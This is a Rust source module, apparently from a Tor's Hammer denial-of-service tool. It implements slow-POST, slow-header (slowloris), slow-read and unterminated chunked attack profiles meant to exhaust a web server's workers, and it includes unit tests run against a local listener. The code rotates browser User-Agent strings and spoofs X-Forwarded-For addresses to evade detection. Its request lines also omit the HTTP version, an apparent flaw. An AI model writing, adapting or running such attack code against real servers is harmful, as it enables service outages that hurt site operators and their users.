//! Attack profiles: each profile opens one connection and slowly consumes it
//! so a vulnerable server ties up a worker waiting on an incomplete request.
//!
//! This module mirrors `src/torshammer/profiles.py` profile for profile so the
//! two backends produce equivalent slow-request traffic:
//!
//! * `slow-post`        - headers with a big `Content-Length`, body dripped one
//!   byte at a time (classic Tor's Hammer).
//! * `slow-post-headers` - request line and headers leaked one line at a time,
//!   then the body is dripped byte by byte.
//! * `slow-headers`     - never finish the request headers (slowloris).
//! * `slow-read`        - full request, then read the response in tiny chunks
//!   with pauses (slow-read / slow-bytes).
//! * `chunked`          - `Transfer-Encoding: chunked` body dripped in small
//!   chunks without the terminating 0-chunk.

use super::rng::Rng;
use super::signals;
use super::stats::Stats;
use super::EngineConfig;
use std::io::{self, Read, Write};
use std::net::TcpStream;
use std::sync::atomic::{AtomicBool, Ordering};
use std::time::Duration;

const ACCEPTS: &[&str] = &[
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "application/json, text/plain, */*",
];

/// Built-in User-Agent pool (Python loads these from `--user-agents`; the Rust
/// engine always randomizes from this built-in list).
const USER_AGENTS: &[&str] = &[
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (compatible; TorsHammer/2.0)",
];

const ALNUM_BYTES: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";

/// Run the profile for the current mode on an established connection.
///
/// Returns `true` if the profile completed naturally, `false` if the run was
/// interrupted by the stop flag.
pub fn run_profile(
    config: &EngineConfig,
    stream: &mut TcpStream,
    stats: &Stats,
    running: &AtomicBool,
    rng: &mut Rng,
) -> bool {
    match config.mode.as_str() {
        "slow-post" => slow_post(config, stream, stats, running, rng),
        "slow-post-headers" => slow_post_headers(config, stream, stats, running, rng),
        "slow-headers" => slow_headers(config, stream, stats, running, rng),
        "slow-read" => slow_read(config, stream, stats, running, rng),
        "chunked" => chunked(config, stream, stats, running, rng),
        _ => false,
    }
}

fn should_stop(running: &AtomicBool) -> bool {
    !running.load(Ordering::Relaxed) || signals::shutdown_requested()
}

fn write_full(stream: &mut TcpStream, data: &[u8], stats: &Stats) -> io::Result<()> {
    stream.write_all(data)?;
    stats.add_sent(data.len() as u64);
    Ok(())
}

fn halt(rng: &mut Rng, config: &EngineConfig, running: &AtomicBool) {
    let delay = rng.range_f64(config.delay_min, config.delay_max);
    super::sleep_slices(running, delay);
}

fn request_path(config: &EngineConfig, rng: &mut Rng) -> String {
    if !config.randomize_path {
        return config.path.clone();
    }
    let separator = if config.path.contains('?') { "&" } else { "?" };
    format!("{}{}{}", config.path, separator, rng.alnum(9))
}

fn base_headers(config: &EngineConfig, rng: &mut Rng) -> Vec<String> {
    let mut headers = vec![
        format!("Host: {}", config.header_host),
        format!("User-Agent: {}", rng.choice(USER_AGENTS)),
        format!("Accept: {}", rng.choice(ACCEPTS)),
        "Accept-Language: en-US,en;q=0.9".to_string(),
        "Accept-Encoding: gzip, deflate".to_string(),
        "Connection: keep-alive".to_string(),
        "Keep-Alive: 900".to_string(),
        "X-Requested-With: XMLHttpRequest".to_string(),
    ];
    if rng.chance(0.5) {
        headers.push(format!("Referer: https://{}/", config.header_host));
    }
    if rng.chance(0.35) {
        headers.push("Cache-Control: no-cache".to_string());
    }
    if rng.chance(0.25) {
        headers.push("DNT: 1".to_string());
    }
    if rng.chance(0.25) {
        headers.push("TE: trailers, deflate".to_string());
    }
    if rng.chance(0.5) {
        headers.push(format!("X-Forwarded-For: {}", rng.random_ip()));
    }
    if rng.chance(0.4) {
        headers.push(format!("X-Trace-Id: {}", rng.hex(6)));
    }
    // Custom headers override defaults (case-insensitive name match).
    for (name, value) in &config.custom_headers {
        let lower = name.to_ascii_lowercase();
        headers.retain(|line| {
            let existing = line.split(':').next().unwrap_or("").trim();
            !existing.eq_ignore_ascii_case(&lower)
        });
        headers.push(format!("{name}: {value}"));
    }
    headers
}

fn dribble(rng: &mut Rng) -> u8 {
    ALNUM_BYTES[rng.range_usize(0, ALNUM_BYTES.len() - 1)]
}

fn slow_post(
    config: &EngineConfig,
    stream: &mut TcpStream,
    stats: &Stats,
    running: &AtomicBool,
    rng: &mut Rng,
) -> bool {
    let length = match &config.custom_body {
        Some(body) => body.len(),
        None => rng.range_usize(
            (config.base_post_length / 2).max(1),
            config.base_post_length,
        ),
    };
    let mut headers = base_headers(config, rng);
    headers.push("Content-Type: application/x-www-form-urlencoded".to_string());
    headers.push(format!("Content-Length: {length}"));
    let method = config.method.clone().unwrap_or_else(|| "POST".to_string());
    let request = format!(
        "{method} {}\r\n{}\r\n\r\n",
        request_path(config, rng),
        headers.join("\r\n")
    );
    if write_full(stream, request.as_bytes(), stats).is_err() {
        return false;
    }

    let mut sent = 0usize;
    while !should_stop(running) && sent < length {
        let byte = match &config.custom_body {
            Some(body) => body[sent],
            None => dribble(rng),
        };
        if write_full(stream, &[byte], stats).is_err() {
            break;
        }
        sent += 1;
        halt(rng, config, running);
    }
    !should_stop(running)
}

fn slow_post_headers(
    config: &EngineConfig,
    stream: &mut TcpStream,
    stats: &Stats,
    running: &AtomicBool,
    rng: &mut Rng,
) -> bool {
    let length = rng.range_usize(
        (config.base_post_length / 2).max(1),
        config.base_post_length,
    );
    let mut headers = base_headers(config, rng);
    headers.push("Content-Type: application/x-www-form-urlencoded".to_string());
    headers.push(format!("Content-Length: {length}"));
    let method = config.method.clone().unwrap_or_else(|| "POST".to_string());
    let mut lines = vec![format!("{method} {}", request_path(config, rng))];
    lines.extend(headers);

    let mut index = 0usize;
    while index < lines.len() && !should_stop(running) {
        if write_full(stream, format!("{}\r\n", lines[index]).as_bytes(), stats).is_err() {
            return !should_stop(running);
        }
        index += 1;
        halt(rng, config, running);
    }
    if !should_stop(running) {
        let _ = write_full(stream, b"\r\n", stats);
    }
    let mut sent = 0usize;
    while !should_stop(running) && sent < length {
        if write_full(stream, &[dribble(rng)], stats).is_err() {
            break;
        }
        sent += 1;
        halt(rng, config, running);
    }
    !should_stop(running)
}

fn slow_headers(
    config: &EngineConfig,
    stream: &mut TcpStream,
    stats: &Stats,
    running: &AtomicBool,
    rng: &mut Rng,
) -> bool {
    let method = config.method.clone().unwrap_or_else(|| "GET".to_string());
    let request = format!("{method} {}\r\n", request_path(config, rng));
    if write_full(stream, request.as_bytes(), stats).is_err() {
        return false;
    }
    for (name, value) in &config.custom_headers {
        if write_full(stream, format!("{name}: {value}\r\n").as_bytes(), stats).is_err() {
            return false;
        }
        halt(rng, config, running);
        if should_stop(running) {
            break;
        }
    }
    while !should_stop(running) {
        let key = format!("X-{}", rng.hex(6));
        let value = rng.hex(8);
        if write_full(stream, format!("{key}: {value}\r\n").as_bytes(), stats).is_err() {
            break;
        }
        halt(rng, config, running);
    }
    !should_stop(running)
}
fn slow_read(
    config: &EngineConfig,
    stream: &mut TcpStream,
    stats: &Stats,
    running: &AtomicBool,
    rng: &mut Rng,
) -> bool {
    let headers = base_headers(config, rng);
    let method = config.method.clone().unwrap_or_else(|| "GET".to_string());
    let request = format!(
        "{method} {}\r\n{}\r\n\r\n",
        request_path(config, rng),
        headers.join("\r\n")
    );
    if write_full(stream, request.as_bytes(), stats).is_err() {
        return false;
    }
    let timeout = Duration::from_secs_f64((config.connect_timeout * 2.0).max(1.0));
    let _ = stream.set_read_timeout(Some(timeout));

    let mut buffer = [0u8; 8];
    loop {
        if should_stop(running) {
            break;
        }
        match stream.read(&mut buffer) {
            Ok(0) => break, // server closed the connection
            Ok(n) => {
                stats.add_received(n as u64);
                halt(rng, config, running);
            }
            Err(ref err)
                if err.kind() == io::ErrorKind::WouldBlock
                    || err.kind() == io::ErrorKind::TimedOut =>
            {
                continue;
            }
            Err(_) => break,
        }
    }
    !should_stop(running)
}

fn chunked(
    config: &EngineConfig,
    stream: &mut TcpStream,
    stats: &Stats,
    running: &AtomicBool,
    rng: &mut Rng,
) -> bool {
    let length = match &config.custom_body {
        Some(body) => body.len(),
        None => rng.range_usize(
            (config.base_post_length / 2).max(1),
            config.base_post_length,
        ),
    };
    let mut headers = base_headers(config, rng);
    headers.push("Transfer-Encoding: chunked".to_string());
    headers.push("Content-Type: application/x-www-form-urlencoded".to_string());
    let method = config.method.clone().unwrap_or_else(|| "POST".to_string());
    let request = format!(
        "{method} {}\r\n{}\r\n\r\n",
        request_path(config, rng),
        headers.join("\r\n")
    );
    if write_full(stream, request.as_bytes(), stats).is_err() {
        return false;
    }

    let mut sent = 0usize;
    while !should_stop(running) && sent < length {
        let size = rng.range_usize(1, 4).min(length - sent);
        let payload: Vec<u8> = match &config.custom_body {
            Some(body) => body[sent..sent + size].to_vec(),
            None => (0..size).map(|_| dribble(rng)).collect(),
        };
        let mut frame = format!("{size:x}\r\n").into_bytes();
        frame.extend_from_slice(&payload);
        frame.extend_from_slice(b"\r\n");
        if write_full(stream, &frame, stats).is_err() {
            break;
        }
        sent += size;
        halt(rng, config, running);
    }
    !should_stop(running)
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::net::TcpListener;

    fn config(mode: &str) -> EngineConfig {
        EngineConfig {
            host: "127.0.0.1".into(),
            port: 9,
            path: "/".into(),
            header_host: "127.0.0.1".into(),
            secure: false,
            mode: mode.into(),
            concurrency: 1,
            duration: 0.0,
            delay_min: 0.0,
            delay_max: 0.001,
            connect_timeout: 3.0,
            base_post_length: 8,
            randomize_path: false,
            method: None,
            custom_headers: vec![("X-Custom".to_string(), "ok".to_string())],
            custom_body: None,
            json: false,
            stats_interval: 1.0,
            quiet: true,
            verbose: false,
            max_errors: 0,
            fail_under: 0,
            fail_on_zero: false,
        }
    }

    #[test]
    fn slow_post_sends_headers_then_drips_full_body() {
        let listener = TcpListener::bind("127.0.0.1:0").unwrap();
        let addr = listener.local_addr().unwrap();
        let collector = std::thread::spawn(move || {
            let (mut sock, _) = listener.accept().unwrap();
            let _ = sock.set_read_timeout(Some(Duration::from_secs(3)));
            let mut buf = Vec::new();
            let mut tmp = [0u8; 1024];
            loop {
                match sock.read(&mut tmp) {
                    Ok(0) => break,
                    Ok(n) => {
                        buf.extend_from_slice(&tmp[..n]);
                        if buf.len() >= 512 {
                            break;
                        }
                    }
                    Err(_) => break,
                }
            }
            buf
        });

        let cfg = config("slow-post");
        let mut rng = Rng::new(1);
        let stats = Stats::new();
        let running = AtomicBool::new(true);
        let mut stream = TcpStream::connect(addr).unwrap();
        let completed = run_profile(&cfg, &mut stream, &stats, &running, &mut rng);
        stream.shutdown(std::net::Shutdown::Both).ok();

        assert!(completed, "slow-post should complete on stop=true");
        let received = collector.join().unwrap();
        let text = String::from_utf8_lossy(&received);
        assert!(text.starts_with("POST /"), "missing request line: {text}");
        assert!(text.contains("Content-Length: 8"), "missing length: {text}");
        assert!(
            text.contains("X-Custom: ok"),
            "missing custom header: {text}"
        );

        let header_end = text.find("\r\n\r\n").expect("header terminator") + 4;
        assert_eq!(
            received.len() - header_end,
            8,
            "expected exactly 8 dripped body bytes"
        );
    }

    #[test]
    fn slow_headers_never_terminates_request() {
        let listener = TcpListener::bind("127.0.0.1:0").unwrap();
        let addr = listener.local_addr().unwrap();
        let stop = std::sync::Arc::new(AtomicBool::new(false));
        let stop2 = stop.clone();
        let collector = std::thread::spawn(move || {
            let (mut sock, _) = listener.accept().unwrap();
            let _ = sock.set_read_timeout(Some(Duration::from_millis(600)));
            let mut buf = Vec::new();
            let mut tmp = [0u8; 1024];
            let deadline = std::time::Instant::now() + Duration::from_millis(1500);
            while std::time::Instant::now() < deadline && !stop2.load(Ordering::Relaxed) {
                match sock.read(&mut tmp) {
                    Ok(n) => buf.extend_from_slice(&tmp[..n]),
                    Err(_) => break,
                }
            }
            buf
        });

        let cfg = config("slow-headers");
        let mut rng = Rng::new(2);
        let stats = Stats::new();
        let running = std::sync::Arc::new(AtomicBool::new(true));
        // The profile only exits when the stop flag fires; flip it after a
        // short window from another thread so this test cannot deadlock.
        let killer = running.clone();
        let killer_thread = std::thread::spawn(move || {
            std::thread::sleep(Duration::from_millis(50));
            killer.store(false, Ordering::Relaxed);
        });
        let mut stream = TcpStream::connect(addr).unwrap();
        let completed = run_profile(&cfg, &mut stream, &stats, &running, &mut rng);
        stream.shutdown(std::net::Shutdown::Both).ok();
        stop.store(true, Ordering::Relaxed);
        let _ = killer_thread.join();

        // With `running=true` this profile never terminates, so after a short
        // window we interrupt via shutdown and it reports `false`.
        assert!(!completed, "interrupted profile must not report completion");
        let received = collector.join().unwrap();
        let text = String::from_utf8_lossy(&received);
        assert!(text.starts_with("GET /"), "missing request line: {text}");
        assert!(!text.contains("\r\n\r\n"), "headers must never terminate");
        assert!(text.contains("X-Custom: ok"));
    }
}
